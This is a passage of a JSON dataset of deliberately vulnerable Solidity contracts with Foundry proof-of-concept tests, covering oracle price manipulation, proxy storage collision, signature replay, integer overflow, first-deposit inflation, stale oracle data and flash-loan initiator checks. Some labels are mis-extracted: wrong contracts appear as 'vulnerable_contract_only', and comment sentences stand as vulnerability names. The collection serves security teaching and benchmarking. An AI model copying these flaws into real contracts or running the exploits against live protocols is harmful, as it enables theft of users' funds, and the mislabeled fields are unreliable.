amount);\n    }\n}\n\ncontract SimplePool {\n    IERC20 public USDaToken;\n    IERC20 public USDbToken;\n\n    constructor(address _USDa, address _USDb) {\n        USDaToken = IERC20(_USDa);\n        USDbToken = IERC20(_USDb);\n    }\n\n    function getPrice() public view returns (uint256) {\n        //Incorrect price calculation over balanceOf\n        uint256 USDaAmount = USDaToken.balanceOf(address(this));\n        uint256 USDbAmount = USDbToken.balanceOf(address(this));\n\n        // Ensure USDbAmount is not zero to prevent division by zero\n        if (USDaAmount == 0) {\n            return 0;\n        }\n\n        // Calculate the price as the ratio of USDa to USDb\n        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;\n        return USDaPrice;\n    }\n\n    function flashLoan(\n        uint256 amount,\n        address borrower,\n        bytes calldata data\n    ) public {\n        uint256 balanceBefore = USDaToken.balanceOf(address(this));\n        require(balanceBefore >= amount, \"Not enough liquidity\");\n        require(\n            USDaToken.transfer(borrower, amount),\n            \"Flashloan transfer failed\"\n        );\n        (bool success, ) = borrower.call(data);\n        require(success, \"Flashloan callback failed\");\n        uint256 balanceAfter = USDaToken.balanceOf(address(this));\n        require(balanceAfter >= balanceBefore, \"Flashloan not repaid\");\n    }\n}\n\ncontract SimpleBank {\n    IERC20 public token; //USDA\n    SimplePool public pool;\n    IERC20 public payoutToken; //USDb\n\n    constructor(address _token, address _pool, address _payoutToken) {\n        token = IERC20(_token);\n        pool = SimplePool(_pool);\n        payoutToken = IERC20(_payoutToken);\n    }\n\n    function exchange(uint256 amount) public {\n        require(\n            token.transferFrom(msg.sender, address(this), amount),\n            \"Transfer failed\"\n        );\n        uint256 price = pool.getPrice();\n        require(price > 0, \"Price cannot be zero\");\n        uint256 tokensToReceive = (amount * price) / (10 ** 18);\n        require(\n            payoutToken.transfer(msg.sender, tokensToReceive),\n            \"Payout transfer failed\"\n        );\n    }\n}\n",
    "vulnerable_contract_only": "contract USDa {\n    constructor() ERC20(\"USDA\", \"USDA\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "oracle_manipulation",
    "severity": "critical",
    "difficulty_tier": 4,
    "vulnerability_name": "Price manipulation",
    "description": "Incorrect price calculation over balanceOf, getReverse may refer to a situation \nwhere the price of a token or asset is not accurately calculated based on the balanceOf function.",
    "scenario": "",
    "fix_description": "Use a manipulation resistant oracle, chainlink, TWAP, etc.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Price_manipulation.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_storage-collision-audio",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Storage-collision-audio.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\n\n// We take Audius as an example. For more details, you can refer to Audius Governance Takeover Post-Mortem 7/23/22 and Remediation.\n// https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22\n\ninterface ILogic {\n    function getguardianAddress() external returns (address);\n\n    function getproxyAdmin() external returns (address);\n\n    function initialize(address) external;\n\n    function getinitializing() external returns (bool);\n\n    function getinitialized() external returns (bool);\n\n    function isConstructor() external view returns (bool);\n}\n\ncontract ContractTest is Test {\n    Logic LogicContract;\n    TestProxy ProxyContract;\n\n    function testStorageCollision() public {\n        LogicContract = new Logic();\n        ProxyContract = new TestProxy(\n            address(LogicContract),\n            address(msg.sender),\n            address(this)\n        );\n\n        console.log(\n            \"Current guardianAddress:\",\n            ILogic(address(ProxyContract)).getguardianAddress()\n        );\n        console.log(\n            \"Current initializing boolean:\",\n            ILogic(address(ProxyContract)).getinitializing()\n        );\n        console.log(\n            \"Current initialized boolean:\",\n            ILogic(address(ProxyContract)).getinitialized()\n        );\n        console.log(\"Try to call initialize to change guardianAddress\");\n        ILogic(address(ProxyContract)).initialize(address(msg.sender));\n\n        console.log(\n            \"After initializing, changed guardianAddress to attacker:\",\n            ILogic(address(ProxyContract)).getguardianAddress()\n        );\n        console.log(\n            \"After initializing,  initializing boolean is still true:\",\n            ILogic(address(ProxyContract)).getinitializing()\n        );\n        console.log(\n            \"After initializing,  initialized boolean:\",\n            ILogic(address(ProxyContract)).getinitialized()\n        );\n\n        /*\nIn this case because the last byte of the proxyAdmin address is `0x72`, initialized was interpreted as a truthy value. \nSimilarly, because the second byte of the proxyAdmin address is `0xea`, \ninitializing was also interpreted as a truthy value. This caused the initializer() modifier to always succeed:\n*/\n\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract TestProxy is TransparentUpgradeableProxy {\n    address private proxyAdmin; // slot 0 - storage collision here\n\n    constructor(\n        address _logic,\n        address _admin,\n        address guardianAddress\n    )\n        TransparentUpgradeableProxy(\n            _logic,\n            _admin,\n            abi.encodeWithSelector(\n                bytes4(0xc4d66de8), // bytes4(keccak256(\"initialize(address)\"))\n                guardianAddress\n            )\n        )\n    {\n        proxyAdmin = _admin;\n    }\n}\n\ncontract Initializable {\n    /**\n     * @dev Indicates that the contract has been initialized.\n     */\n    bool private initialized;\n\n    /**\n     * @dev Indicates that the contract is in the process of being initialized.\n     */\n    bool private initializing;\n\n    /**\n     * @dev Modifier to use in the initializer function of a contract.\n     */\n    modifier initializer() {\n        require(\n            initializing || isConstructor() || !initialized,\n            \"Contract instance has already been initialized\"\n        );\n\n        bool isTopLevelCall = !initializing;\n        if (isTopLevelCall) {\n            initializing = true;\n            initialized = true;\n        }\n\n        _;\n\n        if (isTopLevelCall) {\n            initializing = false;\n        }\n    }\n\n    /// @dev Returns true if and only if the function is running in the constructor\n    function isConstructor() private view returns (bool) {\n        // extcodesize checks the size of the code stored in an address, and\n        // address returns the current address. Since the code is still not\n        // deployed when running a constructor, any checks on its code size will\n        // yield zero, making it an effective way to detect if a contract is\n        // under construction or not.\n        address self = address(this);\n        uint256 cs;\n        assembly {\n            cs := extcodesize(self)\n        }\n        return cs == 0;\n    }\n\n    // Reserved storage space to allow for layout changes in the future.\n    uint256[50] private ______gap;\n\n    function getinitializing() public view returns (bool) {\n        return initializing;\n    }\n\n    function getinitialized() public view returns (bool) {\n        return initialized;\n    }\n}\n\ncontract Logic is Initializable {\n    address private guardianAddress;\n\n    function initialize(address _guardianAddress) public initializer {\n        guardianAddress = _guardianAddress; //Guardian address becomes the only party\n    }\n\n    function getguardianAddress() public view returns (address) {\n        return guardianAddress;\n    }\n}\n",
    "vulnerable_contract_only": "contract Initializable {\n    /**\n     * @dev Indicates that the ",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "storage_collision",
    "severity": "high",
    "difficulty_tier": 4,
    "vulnerability_name": "In this case because the last byte of the proxyAdmin address is `0x72`, initialized was interpreted as a truthy value.",
    "description": "In this case because the last byte of the proxyAdmin address is `0x72`, initialized was interpreted as a truthy value.",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Storage-collision-audio.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_signaturereplaynba",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "SignatureReplayNBA.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nWe use NBA NFT incident as an example.\n\n\u2018Association NFT\u2019 collection by the NBA, which triggers the \u2018Allow list\u2019 to sell out permanently. \n\nThis vulnerability could\u2019ve allowed any malicious entity to mint several NFTs without paying any tokens. \n\nThis contract fails to verify that a signature can be used only once.\n*/\ninterface INBA {\n    struct vData {\n        bool mint_free;\n        uint256 max_mint;\n        address from;\n        uint256 start;\n        uint256 end;\n        uint256 eth_price;\n        uint256 dust_price;\n        bytes signature;\n    }\n\n    function mint_approved(\n        vData memory info,\n        uint256 number_of_items_requested,\n        uint16 _batchNumber\n    ) external;\n}\n\ncontract ContractTest is Test {\n    NBA NBAContract;\n\n    function testMintNFT() public {\n        NBAContract = new NBA();\n        // Copy any successful signature from etherscan.\n        // https://etherscan.io/tx/0x0555d3d7a9d1d5659cd99c69f15fb88da57307c3970678fb5e6547879bc548a6\n        INBA.vData memory info = INBA.vData({\n            mint_free: true,\n            max_mint: 1,\n            from: 0x23Bd1adaB0917A2Ed5007aA39e4040487BE2DAd1,\n            start: 0,\n            end: 5555555555,\n            eth_price: 0,\n            dust_price: 0,\n            signature: hex\"b3589c052ba90e14654d1fac78fb2fd9708355e1a686bed502f65e7ac0a47ad722dcc6c0dcc9445f608162648e000dcc8a845c2ed523202465dc9bdd239484b51b\"\n        });\n        INBA(address(NBAContract)).mint_approved(info, 20, 0);\n    }\n\n    receive() external payable {}\n}\n\ncontract NBA is Test {\n    uint16 public batchNumber;\n\n    address signer = 0x669F499e7BA51836BB76F7dD2bc3C1A37a5342D7;\n    struct vData {\n        bool mint_free;\n        uint256 max_mint;\n        address from;\n        uint256 start;\n        uint256 end;\n        uint256 eth_price;\n        uint256 dust_price;\n        bytes signature;\n    }\n\n    function mint_approved(\n        vData memory info,\n        uint256 number_of_items_requested,\n        uint16 _batchNumber\n    ) external view {\n        require(batchNumber == _batchNumber, \"!batch\");\n        // address from = msg.sender;\n        require(verify(info), \"Unauthorised access secret\"); // check whitelist\n        console.log(\n            \"Verified, you are in whitelist! You can mint:\",\n            number_of_items_requested\n        );\n        //_mintCards(number_of_items_requested, from);\n    }\n\n    function verify(vData memory info) public view returns (bool) {\n        require(info.from != address(0), \"INVALID_SIGNER\");\n        bytes memory cat = abi.encode(\n            info.from,\n            info.start,\n            info.end,\n            info.eth_price,\n            info.dust_price,\n            info.max_mint,\n            info.mint_free\n        );\n        // console.log(\"data-->\");\n        // console.logBytes(cat);\n        bytes32 hash = keccak256(cat);\n        // console.log(\"hash ->\");\n        //    console.logBytes32(hash);\n        require(info.signature.length == 65, \"Invalid signature length\");\n        bytes32 sigR;\n        bytes32 sigS;\n        uint8 sigV;\n        bytes memory signature = info.signature;\n        // ecrecover takes the signature parameters, and the only way to get them\n        // currently is to use assembly.\n        assembly {\n            sigR := mload(add(signature, 0x20))\n            sigS := mload(add(signature, 0x40))\n            sigV := byte(0, mload(add(signature, 0x60)))\n        }\n\n        bytes32 data = keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n        address recovered = ecrecover(data, sigV, sigR, sigS);\n        return signer == recovered;\n    }\n}\n",
    "vulnerable_contract_only": "contract NBA {\n    uint16 public batchNumber;\n\n    address signer = 0x669F499e7BA51836BB76F7dD2bc3C1A37a5342D7;\n    struct vData {\n        bool mint_free;\n        uint256 max_mint;\n        address from;\n        uint256 start;\n        uint256 end;\n        uint256 eth_price;\n        uint256 dust_price;\n        bytes signature;\n    }\n\n    function mint_approved(\n        vData memory info,\n        uint256 number_of_items_requested,\n        uint16 _batchNumber\n    ) external view {\n        require(batchNumber == _batchNumber, \"!batch\");\n        // address from = msg.sender;\n        require(verify(info), \"Unauthorised access secret\"); // check whitelist\n        console.log(\n            \"Verified, you are in whitelist! You can mint:\",\n            number_of_items_requested\n        );\n        //_mintCards(number_of_items_requested, from);\n    }\n\n    function verify(vData memory info) public view returns (bool) {\n        require(info.from != address(0), \"INVALID_SIGNER\");\n        bytes memory cat = abi.encode(\n            info.from,\n            info.start,\n            info.end,\n            info.eth_price,\n            info.dust_price,\n            info.max_mint,\n            info.mint_free\n        );\n        // console.log(\"data-->\");\n        // console.logBytes(cat);\n        bytes32 hash = keccak256(cat);\n        // console.log(\"hash ->\");\n        //    console.logBytes32(hash);\n        require(info.signature.length == 65, \"Invalid signature length\");\n        bytes32 sigR;\n        bytes32 sigS;\n        uint8 sigV;\n        bytes memory signature = info.signature;\n        // ecrecover takes the signature parameters, and the only way to get them\n        // currently is to use assembly.\n        assembly {\n            sigR := mload(add(signature, 0x20))\n            sigS := mload(add(signature, 0x40))\n            sigV := byte(0, mload(add(signature, 0x60)))\n        }\n\n        bytes32 data = keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n        address recovered = ecrecover(data, sigV, sigR, sigS);\n        return signer == recovered;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "signature_replay",
    "severity": "high",
    "difficulty_tier": 4,
    "vulnerability_name": "We use NBA NFT incident as an example.",
    "description": "We use NBA NFT incident as an example.",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/SignatureReplayNBA.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_invariant",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Invariant.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.0;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Invariant issue\n\nDescription:\nAssert is used to check invariants. Those are states our contract or variables should never reach, ever. For example,\nif we decrease a value then it should never get bigger, only smaller.\n\nIn the given code, the Invariant contract contains a receiveMoney function that accepts Ether and \nincrements the sender's balance with the amount received. This balance is stored as an uint64.\nUnsigned integers can store values from 0 to 2^n - 1, so in this case 2^64 - 1, or roughly 18.4467 Ether.\n\nIf the sender sends more Ether than the maximum that can be stored in an uint64, \nan overflow occurs, and the value rolls over to 0 and starts incrementing from there. \nAs a result, the balance does not accurately reflect the amount of Ether received by the contract.\n\nMitigation:\nTo avoid this problem, it's important to ensure that the types you use for storing values \nare appropriately sized for the values they need to store.\n\nREF:\nhttps://ethereum-blockchain-developer.com/027-exceptions/04-invariants-with-assert/\n\n*/\n\n\ncontract ContractTest is Test {\n    Invariant InvariantContract;\n\n    function testInvariant() public {\n        InvariantContract = new Invariant();\n        InvariantContract.receiveMoney{value: 1 ether}();\n        console.log(\n            \"BalanceReceived:\",\n            InvariantContract.balanceReceived(address(this))\n        );\n\n        InvariantContract.receiveMoney{value: 18 ether}();\n        console.log(\n            \"testInvariant, BalanceReceived:\",\n            InvariantContract.balanceReceived(address(this))\n        );\n        /*\nThat's only 553255926290448384 Wei, or around 0.553 Ether. Where is the rest? What happened?\n\nWe are storing the balance in an uint64. Unsigned integers go from 0 to 2^n-1, \nso that's 2^64-1 or 18446744073709551615. So, it can store a max of 18.4467... \nEther. We sent 19 Ether to the contract. \nIt automatically rolls over to 0. So, we end up with 19000000000000000000 - 18446744073709551615 -1 (the 0 value) = 553255926290448384.\n*/\n    }\n\n    receive() external payable {}\n}\n\ncontract Invariant {\n    mapping(address => uint64) public balanceReceived;\n\n    function receiveMoney() public payable {\n        balanceReceived[msg.sender] += uint64(msg.value);\n    }\n\n    function withdrawMoney(address payable _to, uint64 _amount) public {\n        require(\n            _amount <= balanceReceived[msg.sender],\n            \"Not Enough Funds, aborting\"\n        );\n\n        balanceReceived[msg.sender] -= _amount;\n        _to.transfer(_amount);\n    }\n}\n",
    "vulnerable_contract_only": "contract Invariant {\n    mapping(address => uint64) public balanceReceived;\n\n    function receiveMoney() public payable {\n        balanceReceived[msg.sender] += uint64(msg.value);\n    }\n\n    function withdrawMoney(address payable _to, uint64 _amount) public {\n        require(\n            _amount <= balanceReceived[msg.sender],\n            \"Not Enough Funds, aborting\"\n        );\n\n        balanceReceived[msg.sender] -= _amount;\n        _to.transfer(_amount);\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "integer_issues",
    "severity": "high",
    "difficulty_tier": 4,
    "vulnerability_name": "Invariant issue",
    "description": "Assert is used to check invariants. Those are states our contract or variables should never reach, ever. For example,\nif we decrease a value then it should never get bigger, only smaller.\n\nIn the given code, the Invariant contract contains a receiveMoney function that accepts Ether and \nincrements the sender's balance with the amount received. This balance is stored as an uint64.\nUnsigned integers can store values from 0 to 2^n - 1, so in this case 2^64 - 1, or roughly 18.4467 Ether.\n\nIf the sender sends more Ether than the maximum that can be stored in an uint64, \nan overflow occurs, and the value rolls over to 0 and starts incrementing from there. \nAs a result, the balance does not accurately reflect the amount of Ether received by the contract.",
    "scenario": "",
    "fix_description": "To avoid this problem, it's important to ensure that the types you use for storing values \nare appropriately sized for the values they need to store.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Invariant.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_first-deposit",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "first-deposit.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n/*\n\nName: First deposit bug\n\nDescription:\nFirst pool depositor can be front-run and have part of their deposit stolen\nIn this case, we can control the variable \"_supplied.\" \nBy depositing a small amount of loan tokens to obtain pool tokens, \nwe can front-run other depositors' transactions and inflate the price of pool tokens through a substantial \"donation.\"\nConsequently, the attacker can withdraw a greater quantity of loan tokens than they initially possessed.\n\nThis calculation issue arises because, in Solidity, if the pool token value for a user becomes less than 1,\nit is essentially rounded down to 0.\n\nMitigation:  \nConsider minting a minimal amount of pool tokens during the first deposit \nand sending them to zero address, this increases the cost of the attack. \nUniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. \nThe same can be done in this case i.e. when totalSupply() == 0, \nsend the first min liquidity LP tokens to the zero address to enable share dilution.\n\nREF:\nhttps://defihacklabs.substack.com/p/solidity-security-lesson-2-first\nhttps://github.com/sherlock-audit/2023-02-surge-judging/issues/1\nhttps://github.com/transmissions11/solmate/issues/178\n*/\n\ncontract ContractTest is Test {\n    SimplePool SimplePoolContract;\n    MyToken MyTokenContract;\n\n    function setUp() public {\n        MyTokenContract = new MyToken();\n        SimplePoolContract = new SimplePool(address(MyTokenContract));\n    }\n\n    function testFirstDeposit() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        MyTokenContract.transfer(alice, 1 ether + 1);\n        MyTokenContract.transfer(bob, 2 ether);\n\n        vm.startPrank(alice);\n        // Alice deposits 1 wei, gets 1 pool token\n        MyTokenContract.approve(address(SimplePoolContract), 1);\n        SimplePoolContract.deposit(1);\n\n        // Alice transfers 1 ether to the pool, inflating the pool token price\n        MyTokenContract.transfer(address(SimplePoolContract), 1 ether);\n\n        vm.stopPrank();\n        vm.startPrank(bob);\n        // Bob deposits 2 ether, gets 1 pool token due to inflated price\n        // uint shares = _tokenAmount * _sharesTotalSupply / _supplied;\n        // shares = 2000000000000000000 * 1 / 1000000000000000001 = 1.9999999999999999999 => round down to 1.\n        MyTokenContract.approve(address(SimplePoolContract), 2 ether);\n        SimplePoolContract.deposit(2 ether);\n        vm.stopPrank();\n        vm.startPrank(alice);\n\n        MyTokenContract.balanceOf(address(SimplePoolContract));\n\n        // Alice withdraws and gets 1.5 ether, making a profit\n        SimplePoolContract.withdraw(1);\n        assertEq(MyTokenContract.balanceOf(alice), 1.5 ether);\n        console.log(\"Alice balance\", MyTokenContract.balanceOf(alice));\n    }\n\n    receive() external payable {}\n}\n\ncontract MyToken is ERC20, Ownable {\n    constructor() ERC20(\"MyToken\", \"MTK\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract SimplePool {\n    IERC20 public loanToken;\n    uint public totalShares;\n\n    mapping(address => uint) public balanceOf;\n\n    constructor(address _loanToken) {\n        loanToken = IERC20(_loanToken);\n    }\n\n    function deposit(uint amount) external {\n        require(amount > 0, \"Amount must be greater than zero\");\n\n        uint _shares;\n        if (totalShares == 0) {\n            _shares = amount;\n        } else {\n            _shares = tokenToShares(\n                amount,\n                loanToken.balanceOf(address(this)),\n                totalShares,\n                false\n            );\n        }\n\n        require(\n            loanToken.transferFrom(msg.sender, address(this), amount),\n            \"TransferFrom failed\"\n        );\n        balanceOf[msg.sender] += _shares;\n        totalShares += _shares;\n    }\n\n    function tokenToShares(\n        uint _tokenAmount,\n        uint _supplied,\n        uint _sharesTotalSupply,\n        bool roundUpCheck\n    ) internal pure returns (uint) {\n        if (_supplied == 0) return _tokenAmount;\n        uint shares = (_tokenAmount * _sharesTotalSupply) / _supplied;\n        if (\n            roundUpCheck &&\n            shares * _supplied < _tokenAmount * _sharesTotalSupply\n        ) shares++;\n        return shares;\n    }\n\n    function withdraw(uint shares) external {\n        require(shares > 0, \"Shares must be greater than zero\");\n        require(balanceOf[msg.sender] >= shares, \"Insufficient balance\");\n\n        uint tokenAmount = (shares * loanToken.balanceOf(address(this))) /\n            totalShares;\n\n        balanceOf[msg.sender] -= shares;\n        totalShares -= shares;\n\n        require(loanToken.transfer(msg.sender, tokenAmount), \"Transfer failed\");\n    }\n}\n",
    "vulnerable_contract_only": "contract MyToken {\n    constructor() ERC20(\"MyToken\", \"MTK\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "inflation_attack",
    "severity": "medium",
    "difficulty_tier": 4,
    "vulnerability_name": "First deposit bug",
    "description": "First pool depositor can be front-run and have part of their deposit stolen\nIn this case, we can control the variable \"_supplied.\" \nBy depositing a small amount of loan tokens to obtain pool tokens, \nwe can front-run other depositors' transactions and inflate the price of pool tokens through a substantial \"donation.\"\nConsequently, the attacker can withdraw a greater quantity of loan tokens than they initially possessed.\n\nThis calculation issue arises because, in Solidity, if the pool token value for a user becomes less than 1,\nit is essentially rounded down to 0.",
    "scenario": "",
    "fix_description": "Consider minting a minimal amount of pool tokens during the first deposit \nand sending them to zero address, this increases the cost of the attack. \nUniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. \nThe same can be done in this case i.e. when totalSupply() == 0, \nsend the first min liquidity LP tokens to the zero address to enable share dilution.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/first-deposit.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_oracle-stale",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Oracle-stale.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Oracle data feed is insufficiently validated\n\nDescription:\nChainlink price feed latestRoundData is used to retrieve price feed from chainlink. \nWe need to makes sure that the answer is not negative and  price is not stale.\n\nMitigation:\nlatestAnswer function is deprecated. Instead, use the latestRoundData function \nto retrieve the price and make sure to add checks for stale data.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1674611468975878144\nhttps://github.com/sherlock-audit/2023-02-blueberry-judging/issues/94\nhttps://code4rena.com/reports/2022-10-inverse#m-17-chainlink-oracle-data-feed-is-not-sufficiently-validated-and-can-return-stale-price\nhttps://docs.chain.link/data-feeds/historical-data#getrounddata-return-values\n*/\n\ncontract ContractTest is Test {\n    AggregatorV3Interface internal priceFeed;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17568400);\n\n        priceFeed = AggregatorV3Interface(\n            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419\n        ); // ETH/USD\n    }\n\n    function testUnSafePrice() public {\n        //Chainlink oracle data feed is not sufficiently validated and can return stale price.\n        (, int256 answer, , , ) = priceFeed.latestRoundData();\n        emit log_named_decimal_int(\"price\", answer, 8);\n    }\n\n    function testSafePrice() public {\n        (\n            uint80 roundId,\n            int256 answer,\n            ,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        ) = priceFeed.latestRoundData();\n        /*\n        Mitigation:\n        answeredInRound: The round ID in which the answer was computed\n        updatedAt: Timestamp of when the round was updated\n        answer: The answer for this round\n        */\n        require(answeredInRound >= roundId, \"answer is stale\");\n        require(updatedAt > 0, \"round is incomplete\");\n        require(answer > 0, \"Invalid feed answer\");\n        emit log_named_decimal_int(\"price\", answer, 8);\n    }\n\n    receive() external payable {}\n}\n\ninterface AggregatorV3Interface {\n    function latestRoundData()\n        external\n        view\n        returns (\n            uint80 roundId,\n            int256 answer,\n            uint256 startedAt,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        );\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "oracle_manipulation",
    "severity": "critical",
    "difficulty_tier": 4,
    "vulnerability_name": "Oracle data feed is insufficiently validated",
    "description": "Chainlink price feed latestRoundData is used to retrieve price feed from chainlink. \nWe need to makes sure that the answer is not negative and  price is not stale.",
    "scenario": "",
    "fix_description": "latestAnswer function is deprecated. Instead, use the latestRoundData function \nto retrieve the price and make sure to add checks for stale data.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Oracle-stale.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_flashloan-flaw",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Flashloan-flaw.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/*\nName: Missing flash loan initiator check\n\nDescription:\nMissing flash loan initiator check refers to a potential security vulnerability in a flash loan implementation \nwhere the initiator of the flash loan is not properly verified or checked, anyone could exploit the flash loan \nfunctionality and set the receiver address to a vulnerable protocol.\n  \nBy doing so, an attacker could potentially manipulate balances, open trades, drain funds, \nor carry out other malicious actions within the vulnerable protocol. \nThis poses significant risks to the security and integrity of the protocol and its users.\n\nMitigation:  \nCheck the initiator of the flash loan and revert if the initiator is not authorized.\n\nREF:\nhttps://twitter.com/ret2basic/status/1681150722434551809\nhttps://github.com/sherlock-audit/2023-05-dodo-judging/issues/34\n*/\n\ncontract ContractTest is Test {\n    USDa USDaContract;\n    LendingPool LendingPoolContract;\n    SimpleBankBug SimpleBankBugContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        USDaContract = new USDa();\n        LendingPoolContract = new LendingPool(address(USDaContract));\n        SimpleBankBugContract = new SimpleBankBug(\n            address(LendingPoolContract),\n            address(USDaContract)\n        );\n        USDaContract.transfer(address(LendingPoolContract), 10000 ether);\n        FixedSimpleBankContract = new FixedSimpleBank(\n            address(LendingPoolContract),\n            address(USDaContract)\n        );\n    }\n\n    function testFlashLoanFlaw() public {\n        LendingPoolContract.flashLoan(\n            500 ether,\n            address(SimpleBankBugContract),\n            \"0x0\"\n        );\n    }\n\n    function testFlashLoanSecure() public {\n        vm.expectRevert(\"Unauthorized\");\n        LendingPoolContract.flashLoan(\n            500 ether,\n            address(FixedSimpleBankContract),\n            \"0x0\"\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBankBug {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        /* Perform your desired logic here\n        Open opsition, close opsition, drain funds, etc.\n        _closetrade(...) or _opentrade(...)\n        */\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\ncontract FixedSimpleBank {\n    using SafeERC20 for IERC20;\n    IERC20 public USDa;\n    LendingPool public lendingPool;\n\n    constructor(address _lendingPoolAddress, address _asset) {\n        lendingPool = LendingPool(_lendingPoolAddress);\n        USDa = IERC20(_asset);\n    }\n\n    function flashLoan(\n        uint256 amounts,\n        address receiverAddress,\n        bytes calldata data\n    ) external {\n        address receiverAddress = address(this);\n\n        lendingPool.flashLoan(amounts, receiverAddress, data);\n    }\n\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) external {\n        // Mitigation: make sure to check the initiator\n        require(_initiator == address(this), \"Unauthorized\");\n\n        // transfer all borrowed assets back to the lending pool\n        IERC20(USDa).safeTransfer(address(lendingPool), amounts);\n    }\n}\n\ncontract USDa is ERC20, Ownable {\n    constructor() ERC20(\"USDA\", \"USDA\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ninterface IFlashLoanReceiver {\n    function executeOperation(\n        uint256 amounts,\n        address receiverAddress,\n        address _initiator,\n        bytes calldata data\n    ) 